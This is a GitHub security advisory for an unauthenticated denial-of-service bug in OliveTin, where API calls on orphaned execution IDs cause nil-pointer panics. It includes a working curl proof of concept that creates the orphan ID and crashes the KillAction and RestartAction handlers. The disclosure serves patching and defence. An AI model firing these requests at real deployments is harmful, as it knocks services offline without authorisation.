# [M] OliveTin has crash on NPE by calling APIs with invalid bindings or log references

## Summary
Severity: Medium
Advisory: GHSA-fwhj-785h-43hh
CWE: CWE-20, CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-fwhj-785h-43hh
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <0.0.0-20260304225158-bb14c5da3e64

## Details
### Summary
An unauthenticated attacker can trigger server-side panics by first creating an execution log entry with a nil binding via `StartActionByGet` (invalid action ID), then calling `KillAction` or `RestartAction` on that tracking ID. This causes a nil-pointer dereference in API handlers and results in repeated per-request panics (`Empty reply from server`), enabling denial of service through panic/log/CPU amplification.

### Details
The issue is caused by this flow:

  1. `StartActionByGet` accepts arbitrary `actionId` and still calls executor:
     - `service/internal/api/api.go:239`

  2. Executor stores a log entry before binding validation:
     - `service/internal/executor/executor.go:519`

  3. If binding is nil, execution stops, but the log entry remains:
     - `service/internal/executor/executor.go:781`

  4. `KillAction` dereferences `execReqLogEntry.Binding.Action` without checking `Binding`:
     - `service/internal/api/api.go:79`

  5. `RestartAction` has the same unsafe dereference:
     - `service/internal/api/api.go:1285`

Because the dereference happens before authorization checks in these handlers, this is reachable unauthenticated.


### PoC
  Environment:
  - OliveTin default single frontend on `http://localhost:1337`
  - Reproduced on `main` (commit `235493e`) and tag `3000.11.0`

  1) Create orphan tracking ID with invalid action:
  ```bash
  T=$(curl -s -X POST http://localhost:1337/api/StartActionByGet \
    -H 'Content-Type: application/json' \
    --data '{"actionId":"does-not-exist"}' \
    | sed -n 's/.*"executionTrackingId":"\([^"]*\)".*/\1/p')
  echo "$T"

  2. Trigger panic in RestartAction:

  curl -v -X POST http://localhost:1337/api/RestartAction \
    -H 'Content-Type: application/json' \
    --data "{\"executionTrackingId\":\"$T\"}"

  3. Trigger panic in KillAction:

  curl -v -X POST http://localhost:1337/api/KillAction \
    -H 'Content-Type: application/json' \
    --data "{\"executionTrackingId\":\"$T\"}"

Observed client output:

  - curl: (52) Empty reply from server

Observed server log:

  - panic serving ... runtime error: invalid memory address or nil pointer dereference
  - stack points to:
      - service/internal/api/api.go:79 (KillAction)
      - service/internal/api/api.go:1285 (RestartAction)

```
### Impact

This is an unauthenticated denial-of-service vulnerability (panic-based request disruption and log/CPU amplification). An attacker can repeatedly trigger panics remotely without credentials, degrading service reliability and observability.

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-fwhj-785h-43hh
- https://github.com/OliveTin/OliveTin/commit/bb14c5da3e64b03f207c7f38139eb60e97c278fc
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1
